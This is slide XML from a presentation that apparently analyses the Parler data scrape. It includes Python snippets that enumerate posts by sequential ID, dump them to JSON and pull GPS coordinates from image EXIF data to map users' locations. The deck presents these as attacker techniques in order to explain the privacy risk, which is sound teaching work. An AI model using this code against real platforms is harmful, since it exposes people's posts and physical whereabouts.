                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>scrape_post</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>, range(1, 10000000))</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t># Save results</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="800" dirty="0">
              <a:solidFill>
                <a:srgbClr val="272525"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="F2F2F2"/>
              </a:highlight>
              <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
              <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
              <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>with open('</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>parler_complete_dump.json</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>', 'w') as f:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>json.dump</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>(list(results), f)</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6483" y="342900"/>
            <a:ext cx="4662130" cy="266105"/>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Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Metadata Extraction: GPS Tracking from Images</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1650" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Image 0" descr="preencoded.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1989296" y="684967"/>
            <a:ext cx="5767507" cy="3460433"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9514880" y="2283143"/>
            <a:ext cx="4686538" cy="263962"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Beyond the text content, attackers extracted embedded EXIF metadata from images and videos, revealing precise GPS coordinates. This allowed mapping of users' physical locations, creating severe privacy and security risks for platform users, including potential identification of sensitive locations and individuals.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="436483" y="4221361"/>
            <a:ext cx="1276945" cy="159663"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1250"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>GPS Extraction Script</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="436483" y="4424482"/>
            <a:ext cx="13757434" cy="2321123"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1467"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="432435" y="4424482"/>
            <a:ext cx="13765530" cy="2321123"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 524"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="513398" y="4485203"/>
            <a:ext cx="13603605" cy="2199680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t># Parler stored EXIF data including GPS coordinates</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t># Script to extract locations from images</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>from PIL import Image</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>from PIL.ExifTags import TAGS, GPSTAGS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>def get_gps_from_image(image_path):</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>    image = Image.open(image_path)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>    exif = image._getexif()</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>    if exif:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>        for tag_id, value in exif.items():</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>            tag = TAGS.get(tag_id, tag_id)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>            if tag == 'GPSInfo':</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>                gps_data = {}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>                for t in value:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>                    sub_tag = GPSTAGS.get(t, t)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>                    gps_data[sub_tag] = value[t]</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>                return gps_data</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>    return None</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t># Extract GPS from all images</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>for image_file in os.listdir('media/'):</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>    gps = get_gps_from_image(f'media/{image_file}')</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>    if gps:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>        # Map user locations</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>        save_location_data(image_file, gps)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="436483" y="6789063"/>
            <a:ext cx="2745105" cy="212765"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                <a:solidFill>
